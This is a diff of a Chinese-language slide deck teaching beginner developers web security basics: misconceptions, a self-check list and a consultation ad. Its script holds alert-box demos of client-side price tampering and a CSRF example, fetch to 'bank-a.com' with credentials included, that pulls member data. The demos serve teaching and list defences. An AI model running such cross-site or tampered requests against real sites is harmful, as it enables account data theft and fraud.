+                    <p style="font-size: 0.65rem; line-height: 1.3; color: #666">防火牆、警衛、監視器</p>
+                  </div>
+                </div>
+              </div>
+
+              <!-- 思維框架 -->
+
+              <div style="background: linear-gradient(135deg, rgba(0, 122, 255, 0.1) 0%, rgba(52, 199, 89, 0.1) 100%); padding: 1rem; border-radius: var(--radius-medium); border: 2px solid rgba(0, 122, 255, 0.3)">
+                <p style="font-size: 1.05rem; font-weight: 700; color: var(--primary-blue); margin-bottom: 0.6rem; text-align: center">💡 帶走的思維工具：看到功能時問三個問題</p>
+
+                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.6rem">
+                  <div style="text-align: center; background: rgba(255, 255, 255, 0.5); padding: 0.6rem; border-radius: 6px">
+                    <p style="font-size: 0.8rem; font-weight: 600; color: var(--primary-blue); margin-bottom: 0.3rem">使用者體驗？</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3; color: #666">→ 前端可做<br />但不能只靠它</p>
+                  </div>
+
+                  <div style="text-align: center; background: rgba(255, 255, 255, 0.5); padding: 0.6rem; border-radius: 6px">
+                    <p style="font-size: 0.8rem; font-weight: 600; color: #34c759; margin-bottom: 0.3rem">規則或正確性？</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3; color: #666">→ 後端必須做<br />這是最後防線</p>
+                  </div>
+
+                  <div style="text-align: center; background: rgba(255, 255, 255, 0.5); padding: 0.6rem; border-radius: 6px">
+                    <p style="font-size: 0.8rem; font-weight: 600; color: #af52de; margin-bottom: 0.3rem">流量環境風險？</p>
+
+                    <p style="font-size: 0.7rem; line-height: 1.3; color: #666">→ 交給平台<br />程式擋不住</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 18：企業級防護的完整面貌 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2rem; margin-bottom: 0.8rem; color: var(--primary-blue)">企業級資安防護的真實樣貌</h2>
+
+            <p style="font-size: 0.95rem; margin-bottom: 1rem; color: var(--text-secondary)">我們今天介紹的只是入門基礎，企業級標準做了非常非常多事情</p>
+
+            <div style="max-width: 950px; margin: 0 auto">
+              <!-- 圖片展示區 -->
+
+              <div style="background: white; padding: 1.2rem; border-radius: var(--radius-medium); margin-bottom: 1rem; border: 2px solid var(--primary-blue)">
+                <img src="https://learn.microsoft.com/en-us/security/adoption/media/mcra/mcra-overview.png#lightbox" alt="Microsoft 網路安全參考架構 (MCRA)" style="width: 100%; height: auto; border-radius: 6px" />
+
+                <p style="font-size: 0.75rem; color: #666; margin-top: 0.6rem; text-align: center">來源：Microsoft Cybersecurity Reference Architecture (MCRA)</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 19：常見誤區 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2.2rem; margin-bottom: 1.2rem; color: var(--primary-blue)">常見誤區 & 快速問答</h2>
+
+            <div style="max-width: 800px; margin: 0 auto">
+              <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 1.2rem; margin-bottom: 1.2rem">
+                <!-- 誤區 1 -->
+
+                <div style="background: rgba(255, 59, 48, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(255, 59, 48, 0.3)">
+                  <h3 style="color: #ff3b30; font-size: 1.2rem; margin-bottom: 0.8rem">❌ 大平台 = 安全？</h3>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5; color: #666">平台基礎設施安全</p>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5; color: #ff3b30; font-weight: 600">但你的設定、第三方元件仍會帶來風險</p>
+                </div>
+
+                <!-- 誤區 2 -->
+
+                <div style="background: rgba(255, 149, 0, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(255, 149, 0, 0.3)">
+                  <h3 style="color: #ff9500; font-size: 1.2rem; margin-bottom: 0.8rem">❌ 小站不會被攻擊？</h3>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5; color: #666">攻擊者用自動掃描器</p>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5; color: #ff9500; font-weight: 600">不管大小站都會被掃到</p>
+                </div>
+
+                <!-- 誤區 3 -->
+
+                <div style="background: rgba(175, 82, 222, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(175, 82, 222, 0.3)">
+                  <h3 style="color: #af52de; font-size: 1.2rem; margin-bottom: 0.8rem">❌ 前端顯示 = 正確？</h3>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5; color: #666">前端只是介面</p>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5; color: #af52de; font-weight: 600">後端必須做最後驗證</p>
+                </div>
+
+                <!-- 誤區 4 -->
+
+                <div style="background: rgba(0, 122, 255, 0.1); padding: 1.5rem; border-radius: var(--radius-medium); border: 2px solid rgba(0, 122, 255, 0.3)">
+                  <h3 style="color: var(--primary-blue); font-size: 1.2rem; margin-bottom: 0.8rem">❌ HTTPS = 絕對安全？</h3>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5; color: #666">HTTPS 只保護傳輸</p>
+
+                  <p style="font-size: 0.95rem; line-height: 1.5; color: var(--primary-blue); font-weight: 600">XSS、CSRF 照樣會發生</p>
+                </div>
+              </div>
+
+              <!-- 核心訊息 -->
+
+              <div style="background: var(--background-tertiary); padding: 1.5rem; border-radius: var(--radius-medium); text-align: center">
+                <p style="font-size: 1.3rem; font-weight: 600; color: var(--primary-blue)">安全 = 流程 + 習慣 + 檢查</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 20：快速自查清單 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 2rem; margin-bottom: 1rem; color: var(--primary-blue)">快速自查清單</h2>
+
+            <p style="font-size: 1rem; margin-bottom: 1.5rem; color: var(--text-secondary)">實際操作前，用這六個問題確認自己站在資安友善的軌道上。</p>
+
+            <div style="max-width: 820px; margin: 0 auto">
+              <ul style="list-style: none; padding: 0; margin: 0; display: grid; gap: 0.9rem">
+                <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary)">
+                  <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem">心態校準</strong>
+
+                  前端只負責介面，權限與驗證都交給後端；遇到異常先暫停並回報。
+                </li>
+
+                <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary)">
+                  <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem">請求體檢視</strong>
+
+                  檢查 API request body，有沒有 price、role 等敏感數值；後端是否直接依這些值處理？那是 NG。
+                </li>
+
+                <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary)">
+                  <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem">輸入與顯示</strong>
+
+                  留言、備註等欄位是否經過跳脫或驗證？畫面有沒有直接呈現使用者輸入的 HTML？
+                </li>
+
+                <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary)">
+                  <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem">登入安全</strong>
+
+                  Cookie 設定 SameSite=Lax/Strict、HttpOnly 嗎？敏感操作會再要求 OTP 或再次輸入密碼嗎？
+                </li>
+
+                <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary)">
+                  <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem">第三方資源</strong>
+
+                  列出外部 JS / CDN 來源，確認維運者可信且有備援方案，必要時考慮自建或鎖版。
+                </li>
+
+                <li style="background: var(--background-tertiary); padding: 1rem 1.2rem; border-radius: var(--radius-medium); font-size: 0.95rem; line-height: 1.45; color: var(--text-primary)">
+                  <strong style="color: var(--primary-blue); display: block; margin-bottom: 0.3rem">異常處理</strong>
+
+                  發現異常價格或登入紀錄時，有沒有既定的紀錄方式、通報名單與回應流程？
+                </li>
+              </ul>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 21：一對一技術諮詢服務 -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 1.8rem; margin-bottom: 0.5rem; color: var(--primary-blue)">一對一技術諮詢服務</h2>
+
+            <p style="font-size: 0.8rem; margin-bottom: 0.7rem; color: var(--text-secondary)">多年實務開發 x AI 協作與應用經驗</p>
+
+            <div style="max-width: 900px; margin: 0 auto">
+              <!-- 諮詢內容 -->
+
+              <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.6rem; margin-bottom: 0.7rem">
+                <!-- 第一項 -->
+
+                <div style="background: rgba(52, 199, 89, 0.1); padding: 0.7rem; border-radius: var(--radius-medium); border-left: 4px solid #34c759">
+                  <div style="text-align: center; font-size: 1.5rem; margin-bottom: 0.3rem">💡</div>
+
+                  <h3 style="color: #34c759; font-size: 0.85rem; margin-bottom: 0.3rem; text-align: center">Idea → 實現</h3>
+
+                  <p style="font-size: 0.65rem; line-height: 1.2; text-align: center; color: #666">從 insight 到技術實現與架構設計</p>
+                </div>
+
+                <!-- 第二項 -->
+
+                <div style="background: rgba(255, 149, 0, 0.1); padding: 0.7rem; border-radius: var(--radius-medium); border-left: 4px solid #ff9500">
+                  <div style="text-align: center; font-size: 1.5rem; margin-bottom: 0.3rem">⚠️</div>
+
+                  <h3 style="color: #ff9500; font-size: 0.85rem; margin-bottom: 0.3rem; text-align: center">問題預測</h3>
+
+                  <p style="font-size: 0.65rem; line-height: 1.2; text-align: center; color: #666">每個環節可能遇到的問題與專業知識</p>
+                </div>
+
+                <!-- 第三項 -->
+
+                <div style="background: rgba(0, 122, 255, 0.1); padding: 0.7rem; border-radius: var(--radius-medium); border-left: 4px solid var(--primary-blue)">
+                  <div style="text-align: center; font-size: 1.5rem; margin-bottom: 0.3rem">🧠</div>
+
+                  <h3 style="color: var(--primary-blue); font-size: 0.85rem; margin-bottom: 0.3rem; text-align: center">核心 Mindset</h3>
+
+                  <p style="font-size: 0.65rem; line-height: 1.2; text-align: center; color: #666">必須具備的各種思維模式</p>
+                </div>
+              </div>
+
+              <!-- 痛點 & 解法 -->
+
+              <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem; margin-bottom: 0.7rem">
+                <!-- 常見痛點 -->
+
+                <div style="background: rgba(255, 59, 48, 0.1); padding: 0.7rem; border-radius: var(--radius-medium); border: 2px solid rgba(255, 59, 48, 0.3)">
+                  <h3 style="color: #ff3b30; font-size: 0.85rem; margin-bottom: 0.4rem; text-align: center">🚨 2025 常見痛點</h3>
+
+                  <div style="font-size: 0.7rem; line-height: 1.3; text-align: left">
+                    <p style="margin-bottom: 0.25rem">• 上架後維護成「屎山」</p>
+
+                    <p style="margin-bottom: 0.25rem">• 更新時改 A 壞 B</p>
+
+                    <p>• 三天兩頭被資料庫爆破</p>
+                  </div>
+                </div>
+
+                <!-- 諮詢目標 -->
+
+                <div style="background: rgba(52, 199, 89, 0.1); padding: 0.7rem; border-radius: var(--radius-medium); border: 2px solid rgba(52, 199, 89, 0.3)">
+                  <h3 style="color: #34c759; font-size: 0.85rem; margin-bottom: 0.4rem; text-align: center">✅ 我們一起做到</h3>
+
+                  <div style="font-size: 0.7rem; line-height: 1.3; text-align: left">
+                    <p style="margin-bottom: 0.25rem">• 安全性 + 維護性 + 擴充性</p>
+
+                    <p style="margin-bottom: 0.25rem">• 企業級標準思維</p>
+
+                    <p>• Junior → 進階特質養成</p>
+                  </div>
+                </div>
+              </div>
+
+              <!-- CTA -->
+
+              <div style="background: linear-gradient(135deg, rgba(0, 122, 255, 0.15) 0%, rgba(175, 82, 222, 0.15) 100%); padding: 0.8rem; border-radius: var(--radius-medium); border: 2px solid var(--primary-blue); text-align: center">
+                <p style="font-size: 0.9rem; font-weight: 700; color: var(--primary-blue); margin-bottom: 0.4rem">🎯 適合新手工程師 / Vibe Coder</p>
+
+                <p style="font-size: 0.75rem; line-height: 1.3; color: #666; margin-bottom: 0.5rem">不藏私、傾囊相授，保證你收穫滿滿</p>
+
+                <div style="display: flex; justify-content: center; gap: 0.8rem; flex-wrap: wrap">
+                  <a href="https://buymeacoffee.com/cablate/e/448257" target="_blank" rel="noopener noreferrer" style="font-size: 0.75rem; padding: 0.35rem 0.7rem; background: var(--primary-blue); color: white; border-radius: 6px; font-weight: 600; text-decoration: none; display: inline-block; transition: background 0.3s"> 🔗 立即預約諮詢 </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Slide 22：Q&A -->
+
+        <section>
+          <div class="content-wrapper">
+            <h2 style="font-size: 3rem; margin-bottom: 1.5rem; color: var(--primary-blue)">問題時間</h2>
+
+            <div style="max-width: 700px; margin: 0 auto">
+              <div style="background: var(--background-tertiary); padding: 2.5rem; border-radius: var(--radius-large); text-align: center">
+                <div style="font-size: 4rem; margin-bottom: 1.5rem">💬</div>
+              </div>
+            </div>
+          </div>
+        </section>
+      </div>
     </div>
 
     <!-- 核心 JavaScript 庫 -->
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.min.js" crossorigin></script>
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js" crossorigin></script>
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.7.0/p5.min.js" crossorigin="anonymous"></script>
+
     <script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js" crossorigin></script>
 
     <!-- 自定義組件（僅保留實際使用的） -->
+
     <script type="module" src="Components/Widget/PageShow.js" crossorigin></script>
+
     <script type="module" src="Components/Widget/AnimatedLink.js" crossorigin></script>
 
     <!-- Widget 組件 -->
+
     <script type="module" src="Components/Widget/Card.js" crossorigin></script>
+
     <script type="module" src="Components/Widget/ComparisonTable.js" crossorigin></script>
+
     <script type="module" src="Components/Widget/InfoBadge.js" crossorigin></script>
 
     <!-- Prompt 組件 -->
+
     <script src="Components/Prompt/PromptBox.js" crossorigin></script>
+
     <script src="Components/Prompt/CopyButton.js" crossorigin></script>
 
     <script src="script.js" type="module"></script>
 
     <!-- Slide 6 互動邏輯 -->
+
     <script>
-        // 前端不可信互動演示
-        document.addEventListener('DOMContentLoaded', function() {
-            const addToCartBtn = document.getElementById('addToCartBtn');
-            if (addToCartBtn) {
-                addToCartBtn.addEventListener('click', function() {
-                    const hackPrice = document.getElementById('hackPrice').value;
-                    const requestBody = {
-                        productId: "prod_12345",
-                        productName: "精美產品",
-                        price: parseFloat(hackPrice) || 1,
-                        quantity: 1,
-                        totalAmount: parseFloat(hackPrice) || 1
-                    };
+      // 前端不可信互動演示
 
-                    alert(
-                        '⚠️ 前端竄改攻擊演示！\n\n' +
-                        '📡 即將發送的 Request Body：\n' +
-                        JSON.stringify(requestBody, null, 2) + '\n\n' +
-                        '🚨 如果後端直接接受這個價格：\n' +
-                        '→ 攻擊者用 $' + hackPrice + ' 買到原價 $1,999 的商品！\n\n' +
-                        '✅ 正確做法：\n' +
-                        '前端只傳 productId + quantity\n' +
-                        '後端從資料庫查詢正確價格並計算'
-                    );
-                });
-            }
-        });
+      document.addEventListener("DOMContentLoaded", function () {
+        const addToCartBtn = document.getElementById("addToCartBtn");
 
-        // CSRF 互動演示
-        document.addEventListener('DOMContentLoaded', function() {
-            // 模擬 A 網站登入狀態
-            const simulateLoginBtn = document.getElementById('simulateLoginBtn');
-            if (simulateLoginBtn) {
-                simulateLoginBtn.addEventListener('click', function() {
-                    alert(
-                        '🏦 A 網站（銀行）登入狀態\n\n' +
-                        '✓ 已登入為：user@example.com\n' +
-                        '🍪 Cookie 已設定：\n' +
-                        '   session=abc123xyz\n' +
-                        '   HttpOnly=false\n' +
-                        '   SameSite=None ⚠️\n\n' +
-                        '⚠️ 危險：SameSite=None 允許跨站請求攜帶 Cookie！'
-                    );
-                });
-            }
+        if (addToCartBtn) {
+          addToCartBtn.addEventListener("click", function () {
+            const hackPrice = document.getElementById("hackPrice").value;
 
-            // CSRF 攻擊按鈕
-            const csrfAttackBtn = document.getElementById('csrfAttackBtn');
-            if (csrfAttackBtn) {
-                csrfAttackBtn.addEventListener('click', function() {
-                    alert(
-                        '⚠️ CSRF 攻擊演示！\n\n' +
-                        '😈 B 網站執行了這段惡意代碼：\n' +
-                        'fetch(\'https://bank-a.com/api/user\', {\n' +
-                        '  credentials: \'include\'\n' +
-                        '})\n\n' +
-                        '🚨 發生了什麼：\n' +
-                        '1. B 網站向 A 網站發送請求\n' +
-                        '2. 瀏覽器自動附上 A 網站的 Cookie\n' +
-                        '3. A 網站收到帶 Cookie 的請求\n' +
-                        '4. A 網站誤認為是合法請求\n' +
-                        '5. 回傳會員資料給 B 網站！\n\n' +
-                        '✅ 防護方法：\n' +
-                        '• Cookie 設定 SameSite=Lax/Strict\n' +
-                        '• 使用 CSRF Token 驗證\n' +
-                        '• 檢查 Referer/Origin header'
-                    );
-                });
-            }
-        });
+            const requestBody = {
+              productId: "prod_12345",
+
+              productName: "精美產品",
+
+              price: parseFloat(hackPrice) || 1,
+
+              quantity: 1,
+
+              totalAmount: parseFloat(hackPrice) || 1,
+            };
+
+            alert("⚠️ 前端竄改攻擊演示！\n\n" + "📡 即將發送的 Request Body：\n" + JSON.stringify(requestBody, null, 2) + "\n\n" + "🚨 如果後端直接接受這個價格：\n" + "→ 攻擊者用 $" + hackPrice + " 買到原價 $1,999 的商品！\n\n" + "✅ 正確做法：\n" + "前端只傳 productId + quantity\n" + "後端從資料庫查詢正確價格並計算");
+          });
+        }
+      });
+
+      // CSRF 互動演示
+
+      document.addEventListener("DOMContentLoaded", function () {
+        // 模擬 A 網站登入狀態
+
+        const simulateLoginBtn = document.getElementById("simulateLoginBtn");
+
+        if (simulateLoginBtn) {
+          simulateLoginBtn.addEventListener("click", function () {
+            alert("🏦 A 網站（銀行）登入狀態\n\n" + "✓ 已登入為：user@example.com\n" + "🍪 Cookie 已設定：\n" + "   session=abc123xyz\n" + "   HttpOnly=false\n" + "   SameSite=None ⚠️\n\n" + "⚠️ 危險：SameSite=None 允許跨站請求攜帶 Cookie！");
+          });
+        }
+
+        // CSRF 攻擊按鈕
+
+        const csrfAttackBtn = document.getElementById("csrfAttackBtn");
+
+        if (csrfAttackBtn) {
+          csrfAttackBtn.addEventListener("click", function () {
+            alert("⚠️ CSRF 攻擊演示！\n\n" + "😈 B 網站執行了這段惡意代碼：\n" + "fetch('https://bank-a.com/api/user', {\n" + "  credentials: 'include'\n" + "})\n\n" + "🚨 發生了什麼：\n" + "1. B 網站向 A 網站發送請求\n" + "2. 瀏覽器自動附上 A 網站的 Cookie\n" + "3. A 網站收到帶 Cookie 的請求\n" + "4. A 網站誤認為是合法請求\n" + "5. 回傳會員資料給 B 網站！\n\n" + "✅ 防護方法：\n" + "• Cookie 設定 SameSite=Lax/Strict\n" + "• 使用 CSRF Token 驗證\n" + "• 檢查 Referer/Origin header");
+          });
+        }
+      });
     </script>
-</body>
+  </body>
 </html>
